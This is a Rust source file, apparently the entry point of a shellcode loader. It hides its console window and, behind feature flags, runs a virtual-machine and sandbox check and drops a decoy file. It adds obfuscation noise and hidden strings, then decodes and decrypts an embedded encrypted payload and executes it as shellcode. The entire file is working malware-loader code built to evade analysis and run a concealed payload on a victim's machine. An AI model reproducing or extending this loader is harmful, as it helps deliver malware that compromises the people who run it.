#![windows_subsystem = "windows"]
mod forgery;
mod guard;
mod utils;
use utils::obfuscation_noise;
mod exec;
mod decrypt;
mod alloc_mem;

use rustcrypt_ct_macros::obf_lit;
use decrypt::decrypt;
use exec::exec;
use std::process;
use base64::engine::general_purpose::STANDARD;
use base64::Engine;
const ENCRYPT_B64: &'static [u8] = include_bytes!("encrypt.bin");

fn base64_decode() -> Option<Vec<u8>> {
    let raw = std::str::from_utf8(ENCRYPT_B64).ok()?;
    let decoded = STANDARD.decode(raw.trim()).ok()?;
    Some(decoded)
}

fn main() {
    #[cfg(feature = "sandbox")]
    unsafe {
        guard::guard_vm();
    }

    obfuscation_noise();

    #[cfg(feature = "with_forgery")]
    forgery::bundle::bundlefile();

    #[cfg(feature = "base64_decode")]
    let decrypted_data = match base64_decode() {
            Some(d) => d,
            None => process::exit(1),
    };
    
    obfuscation_noise();

    unsafe {
        let shellcode_ptr: usize = match decrypt(&decrypted_data) {
            Ok(p) => p,
            Err(e) => {
                println!("{} {}", obf_lit!("Failed to decrypt:"), e);
                process::exit(1);
            }
        };
        
        obfuscation_noise();
        
        if let Err(e) = exec(shellcode_ptr) {
            println!("{} {}", obf_lit!("Failed to execute:"), e);
            process::exit(1);
        }
    }
}